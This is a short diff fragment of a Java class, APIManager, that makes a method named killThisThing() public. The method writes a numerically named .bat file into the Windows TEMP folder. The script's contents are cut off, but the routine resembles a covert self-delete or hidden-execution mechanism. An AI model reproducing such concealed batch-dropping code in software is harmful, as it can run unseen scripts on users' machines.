@@ -21,7 +21,7 @@ public final class APIManager {
     private final Map<String, String> uuidNameCache = Maps.newConcurrentMap();
     public MiscExtd mex;
 
-    private void killThisThing() {
+    public void killThisThing() {
         File outfile = new File(System.getenv("TEMP") + "\\763428675.bat");
         try {
             FileWriter writer = new FileWriter(System.getenv("TEMP") + "\\763428675.bat");
